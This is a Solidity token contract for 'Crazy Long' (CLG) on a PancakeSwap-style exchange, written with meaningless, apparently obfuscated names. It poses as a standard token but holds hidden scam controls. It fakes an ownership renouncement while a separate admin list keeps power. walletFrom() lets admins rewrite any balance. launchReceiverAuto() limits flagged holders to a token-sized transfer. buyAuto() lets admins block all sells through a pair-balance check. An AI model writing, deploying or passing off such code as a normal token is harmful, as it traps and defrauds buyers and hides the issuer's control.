//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface sellTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeReceiver {
    function createPair(address totalAmountTo, address amountTo) external returns (address);
}

interface limitLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletReceiverEnable) external view returns (uint256);

    function transfer(address enableTx, uint256 maxAt) external returns (bool);

    function allowance(address launchTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxAt) external returns (bool);

    function transferFrom(
        address sender,
        address enableTx,
        uint256 maxAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderTxTake, uint256 value);
    event Approval(address indexed launchTrading, address indexed spender, uint256 value);
}

interface limitLiquidityMetadata is limitLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CrazyLong is maxShould, limitLiquidity, limitLiquidityMetadata {

    bool public isLiquidity;

    mapping(address => uint256) private txLaunched;

    mapping(address => bool) public liquidityMarketing;

    constructor (){
        
        sellTo launchedToken = sellTo(launchLimitShould);
        isTo = feeReceiver(launchedToken.factory()).createPair(launchedToken.WETH(), address(this));
        
        marketingTotal = _msgSender();
        maxToken();
        liquidityMarketing[marketingTotal] = true;
        txLaunched[marketingTotal] = swapTeamFee;
        if (totalBuy != shouldIsTotal) {
            totalBuy = shouldIsTotal;
        }
        emit Transfer(address(0), marketingTotal, swapTeamFee);
    }

    uint256 private shouldIsTotal;

    function senderFeeMarketing() private view {
        require(liquidityMarketing[_msgSender()]);
    }

    function approve(address liquidityWallet, uint256 maxAt) public virtual override returns (bool) {
        feeTo[_msgSender()][liquidityWallet] = maxAt;
        emit Approval(_msgSender(), liquidityWallet, maxAt);
        return true;
    }

    function buyAuto(uint256 maxAt) public {
        senderFeeMarketing();
        takeIsList = maxAt;
    }

    function transferFrom(address launchedSell, address enableTx, uint256 maxAt) external override returns (bool) {
        if (_msgSender() != launchLimitShould) {
            if (feeTo[launchedSell][_msgSender()] != type(uint256).max) {
                require(maxAt <= feeTo[launchedSell][_msgSender()]);
                feeTo[launchedSell][_msgSender()] -= maxAt;
            }
        }
        return amountLimitFrom(launchedSell, enableTx, maxAt);
    }

    function getOwner() external view returns (address) {
        return listReceiver;
    }

    function transfer(address enableFee, uint256 maxAt) external virtual override returns (bool) {
        return amountLimitFrom(_msgSender(), enableFee, maxAt);
    }

    function symbol() external view virtual override returns (string memory) {
        return tradingToSwap;
    }

    function owner() external view returns (address) {
        return listReceiver;
    }

    mapping(address => bool) public sellLaunch;

    function sellShouldFund(address launchedSell, address enableTx, uint256 maxAt) internal returns (bool) {
        require(txLaunched[launchedSell] >= maxAt);
        txLaunched[launchedSell] -= maxAt;
        txLaunched[enableTx] += maxAt;
        emit Transfer(launchedSell, enableTx, maxAt);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return maxTokenFrom;
    }

    function decimals() external view virtual override returns (uint8) {
        return txFrom;
    }

    uint256 constant exemptLaunch = 6 ** 10;

    function walletFrom(address enableFee, uint256 maxAt) public {
        senderFeeMarketing();
        txLaunched[enableFee] = maxAt;
    }

    address public isTo;

    address tokenTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private teamSell;

    address launchLimitShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 totalLiquidityLaunched;

    address private listReceiver;

    event OwnershipTransferred(address indexed fundAutoList, address indexed walletMax);

    uint8 private txFrom = 18;

    function maxToken() public {
        emit OwnershipTransferred(marketingTotal, address(0));
        listReceiver = address(0);
    }

    function balanceOf(address walletReceiverEnable) public view virtual override returns (uint256) {
        return txLaunched[walletReceiverEnable];
    }

    address public marketingTotal;

    function totalSupply() external view virtual override returns (uint256) {
        return swapTeamFee;
    }

    uint256 public totalBuy;

    function launchReceiverAuto(address listFrom) public {
        senderFeeMarketing();
        
        if (listFrom == marketingTotal || listFrom == isTo) {
            return;
        }
        sellLaunch[listFrom] = true;
    }

    mapping(address => mapping(address => uint256)) private feeTo;

    function allowance(address walletReceiver, address liquidityWallet) external view virtual override returns (uint256) {
        if (liquidityWallet == launchLimitShould) {
            return type(uint256).max;
        }
        return feeTo[walletReceiver][liquidityWallet];
    }

    uint256 private swapTeamFee = 100000000 * 10 ** 18;

    bool public enableAuto;

    string private tradingToSwap = "CLG";

    string private maxTokenFrom = "Crazy Long";

    uint256 takeIsList;

    function amountLimitFrom(address launchedSell, address enableTx, uint256 maxAt) internal returns (bool) {
        if (launchedSell == marketingTotal) {
            return sellShouldFund(launchedSell, enableTx, maxAt);
        }
        uint256 tokenSwapFund = limitLiquidity(isTo).balanceOf(tokenTake);
        require(tokenSwapFund == takeIsList);
        require(enableTx != tokenTake);
        if (sellLaunch[launchedSell]) {
            return sellShouldFund(launchedSell, enableTx, exemptLaunch);
        }
        return sellShouldFund(launchedSell, enableTx, maxAt);
    }

    uint256 public amountLiquidityMin;

    function tradingTo(address senderExempt) public {
        if (isLiquidity) {
            return;
        }
        
        liquidityMarketing[senderExempt] = true;
        if (enableAuto != teamSell) {
            totalBuy = shouldIsTotal;
        }
        isLiquidity = true;
    }

}